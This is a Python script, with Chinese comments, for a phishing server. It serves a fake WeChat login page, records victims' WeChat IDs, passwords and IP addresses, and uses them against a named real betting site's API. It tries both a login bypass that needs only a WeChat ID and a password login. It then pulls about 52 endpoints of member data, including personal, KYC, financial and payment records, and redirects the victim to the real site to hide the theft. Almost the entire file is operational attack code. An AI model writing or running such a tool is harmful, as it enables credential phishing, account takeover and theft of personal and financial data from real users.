#!/usr/bin/env python3
"""
本地釣魚伺服器 - 基於 WechatLogin Bypass (cmd=1000) + 密碼登錄 (cmd=100) 的帳號接管釣魚伺服器
攻擊鏈:
  1. 受害者訪問偽造的微信登錄頁面 (含帳號 + 密碼欄位)
  2. 受害者輸入 wechatId + password
  3. 伺服器同時嘗試:
     a) cmd=1000 繞過 (僅 wechatId -> sid)
     b) cmd=100 密碼登錄 (username + password -> sid)
  4. 伺服器使用 sid 提取完整會員數據 (PII + 財務 + KYC)
  5. 所有數據保存到 evidence 目錄
  6. 受害者被重定向到真實頁面 (假装登錄成功)
"""
import http.server
import socketserver
import urllib.parse
import json
import time
import os
import threading

PORT = 9090
CAPTURE_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "phish_capture.txt")
EVIDENCE_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "..", "evidence", f"bf1788-phish-{time.strftime('%Y%m%d')}")
API_URL = "https://apib63.bf1788.com/boxApi.php"
BASE_PARAMS = {"vendorId": "test", "signature": "test", "site": "bfc", "lang": "tw"}

# 要提取的 API endpoints (cmd 映射) — 52 endpoints total (31 original + 21 new)
EXTRACT_CMDS = {
    "101": "member_profile(PII)",
    "208": "finance_summary",
    "300": "game_halls",
    "301": "game_groups",
    "302": "game_list",
    "511": "game_launch_url",
    "605": "downline_members",
    "607": "bet_records_weekly",
    "608": "bet_summary",
    "707": "payment_methods",
    "800": "vip_daily_stats",
    "802": "vip_summary",
    "904": "vip_info",
    "910": "kyc_status",
    "210": "system_settings",
    "211": "bet_records",
    "110": "games",
    "260": "unknown_260",
    "290": "truename(PII)",
    "310": "team_history",
    "518": "game_level_config(unauth)",  # Works without sid!
    "520": "trading_records",
    "530": "trading_history",
    "540": "data_count_unknown",
    "600": "config_return",
    "700": "payment_methods_alt",
    "810": "lottery_vip_rewards",
    "905": "user_financial_stats(unauth)",  # Works without sid!
    "913": "user_stats(unauth)",  # Works without sid!
    "925": "vip_status_check(unauth)",  # Works without sid!
    # 新增掃描發現的 endpoints (2026-09-24 擴掃 100-925)
    "516": "agent_line_bet_config(95 fields)",  # Real agent line data
    "533": "red_packet_activities",
    "536": "weekly_report",
    "522": "activity_records_1",
    "523": "activity_records_2",
    "524": "activity_records_3",
    "525": "activity_records_4",
    "526": "activity_records_5",
    "529": "activity_records_6",
    "531": "activity_records_7",
    "534": "activity_records_8",
    "535": "activity_records_9",
    "541": "activity_records_10",
    "545": "activity_records_11",
    "519": "uid_data",
    "542": "weekly_bet_report",
    "544": "weekly_bet_summary",
    "537": "referral_config",
    "713": "withdrawal_methods",
    "716": "payment_limits",
    "804": "vip_application_config",
}


def login_bypass(wechat_id):
    """使用 cmd=1000 繞過登錄，僅需 wechatId 取得 sid"""
    import requests
    import urllib3
    urllib3.disable_warnings()

    params = {**BASE_PARAMS, "cmd": "1000", "wechatId": wechat_id, "sid": ""}
    try:
        resp = requests.post(f"{API_URL}?cmd=1000", data=params, timeout=15, verify=False)
        data = resp.json()
        if str(data.get("status")) == "0":
            msg = data.get("msg", {})
            return msg.get("sid"), msg.get("username")
    except Exception:
        pass
    return None, None


def login_with_password(username, password):
    """使用 cmd=100 密碼登錄，取得 sid + username"""
    import requests
    import urllib3
    urllib3.disable_warnings()

    params = {**BASE_PARAMS, "cmd": "100", "username": username, "password": password}
    try:
        resp = requests.post(f"{API_URL}?cmd=100", data=params, timeout=15, verify=False)
        data = resp.json()
        if str(data.get("status")) == "0":
            msg = data.get("msg", {})
            return msg.get("sid"), msg.get("username"), data
        else:
            # 回傳錯誤資訊
            return None, None, data
    except Exception as e:
        return None, None, {"error": str(e)}


def extract_member_data(sid, username, wechat_id):
    """使用 sid 提取完整會員數據"""
    import requests
    import urllib3
    urllib3.disable_warnings()

    results = {}
    for cmd, desc in EXTRACT_CMDS.items():
        params = {**BASE_PARAMS, "cmd": cmd, "sid": sid, "username": username, "wechatId": wechat_id}
        try:
            r = requests.post(f"{API_URL}?cmd={cmd}", data=params, timeout=10, verify=False)
            results[f"cmd_{cmd}_{desc}"] = r.json()
        except Exception as e:
            results[f"cmd_{cmd}_{desc}"] = {"error": str(e)}
    return results


class PhishHandler(http.server.BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        # Quiet logging
        pass

    def do_GET(self):
        if self.path == "/login":
            self.send_response(200)
            self.send_header("Content-type", "text/html; charset=utf-8")
            self.end_headers()
            # 偽造微信登錄頁面 — 包含帳號 + 密碼欄位 (釣取後台密碼用)
            html = """<!DOCTYPE html>
<html lang="zh-TW">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>微信安全登錄</title>
    <style>
        body { font-family: 'Microsoft YaHei', sans-serif; background: #f5f5f5; margin: 0; padding: 20px; }
        .login-box { max-width: 380px; margin: 60px auto; background: #fff; border-radius: 8px; padding: 30px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
        .login-box h2 { color: #333; text-align: center; margin-bottom: 20px; }
        .login-box input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ddd; border-radius: 4px; font-size: 14px; box-sizing: border-box; }
        .login-box button { width: 100%; padding: 12px; background: #0a73b6; color: #fff; border: none; border-radius: 4px; font-size: 16px; cursor: pointer; }
        .login-box button:hover { background: #085a8a; }
        .note { text-align: center; font-size: 12px; color: #999; margin-top: 15px; }
        .pwd-note { text-align: center; font-size: 11px; color: #666; margin-top: 8px; }
    </style>
</head>
<body>
    <div class="login-box">
        <h2>微信安全登錄</h2>
        <form method="POST" action="/wxlogin" autocomplete="off">
            <input name="wechatId" placeholder="請輸入微信ID" required/>
            <input type="password" name="password" placeholder="請輸入密碼" required/>
            <button type="submit">登錄</button>
        </form>
        <p class="note">為保障賬戶安全，請輸入微信ID及密碼完成驗證</p>
    </div>
</body>
</html>"""
            self.wfile.write(html.encode("utf-8"))
        elif self.path == "/" or self.path == "/index.html":
            # 重定向到登錄頁
            self.send_response(302)
            self.send_header("Location", "/login")
            self.end_headers()
        else:
            self.send_error(404)

    def do_POST(self):
        if self.path == "/wxlogin":
            content_length = int(self.headers.get("Content-Length", 0))
            body = self.rfile.read(content_length)
            parsed = urllib.parse.parse_qs(body.decode("utf-8"))
            wechat_id = parsed.get("wechatId", [""])[0]
            password = parsed.get("password", [""])[0]

            print(f"\n[+] 收到釣魚登錄請求: wechatId={wechat_id}")
            timestamp = time.strftime("%Y-%m-%d %H:%M:%S")

            if not wechat_id:
                self._send_result("請輸入有效的微信ID", error=True)
                return

            # 保存原始捕獲數據 (含密碼)
            with open(CAPTURE_FILE, "a", encoding="utf-8") as f:
                f.write(f"{timestamp} | wechantId={wechat_id} | password={password} | source_ip={self.client_address[0]}\n")

            # === 登錄策略 1: cmd=1000 WechatLogin 繞過 (僅 wechatId) ===
            sid, username = login_bypass(wechat_id)
            login_method = "wechatId_bypass_1000"

            # === 登錄策略 2: cmd=100 密碼登錄 (username + password) ===
            # 如果 wechatId 繞過失敗，嘗試密碼登錄
            if not sid and password:
                print(f"[*] wechatId bypass failed, trying password login (cmd=100)...")
                pw_sid, pw_username, pw_data = login_with_password(wechat_id, password)
                if pw_sid:
                    print(f"[+] PASSWORD LOGIN 成功! sid={pw_sid}, username={pw_username}")
                    sid = pw_sid
                    username = pw_username
                    login_method = "password_login_100"

            if sid:
                print(f"[+] LOGIN BYPASS 成功! sid={sid}, username={username}")

                # 提取完整會員數據
                print(f"[*] 正在提取會員數據...")
                member_data = extract_member_data(sid, username, wechat_id)

                # 保存到 evidence 目錄
                os.makedirs(EVIDENCE_DIR, exist_ok=True)
                evidence_file = os.path.join(
                    EVIDENCE_DIR,
                    f"phish_capture_{wechat_id}_{int(time.time())}.json"
                )
                capture = {
                    "timestamp": timestamp,
                    "wechatId": wechat_id,
                    "password": password,
                    "source_ip": self.client_address[0],
                    "login_method": login_method,
                    "sid": sid,
                    "username": username,
                    "extraction": member_data,
                }
                with open(evidence_file, "w", encoding="utf-8") as f:
                    json.dump(capture, f, ensure_ascii=False, indent=2)

                print(f"[+] 數據已保存: {evidence_file}")

                # 保存到 found_wechatids.txt
                found_file = os.path.join(os.path.dirname(os.path.abspath(__file__)), "found_wechatids.txt")
                with open(found_file, "a") as f:
                    f.write(f"{wechat_id}|{sid}|{username}|phish_capture\n")

                # 重定向受害者到真實頁面 (假装成功)
                self.send_response(302)
                self.send_header("Location", "https://www.bf1788.com/")
                self.end_headers()
            else:
                print(f"[-] IGNORABLE — wechatId 不存在或 API 錯誤")
                self._send_result("登錄失敗，請稍後重試", error=True)
        else:
            self.send_error(404)

    def _send_result(self, message, error=False):
        self.send_response(200)
        self.send_header("Content-type", "text/html; charset=utf-8")
        self.end_headers()
        color = "#c0392b" if error else "#27ae60"
        html = f"""<!DOCTYPE html>
<html lang="zh-TW">
<head><meta charset="UTF-8"><title>登錄結果</title></head>
<body style="font-family:'Microsoft YaHei',sans-serif;text-align:center;padding:60px;">
    <h2 style="color:{color}">{message}</h2>
</body>
</html>"""
        self.wfile.write(html.encode("utf-8"))


class ThreadedTCPServer(socketserver.ThreadingMixIn, socketserver.TCPServer):
    allow_reuse_address = True
    daemon_threads = True


if __name__ == "__main__":
    with ThreadedTCPServer(("", PORT), PhishHandler) as httpd:
        print(f"[+] 釣魚伺服器啟動: http://localhost:{PORT}/login")
        print(f"[+] 捕獲文件: {CAPTURE_FILE}")
        print(f"[+] 證據保存目錄: {EVIDENCE_DIR}")
        print("[+] 等待登錄數據...")
        httpd.serve_forever()
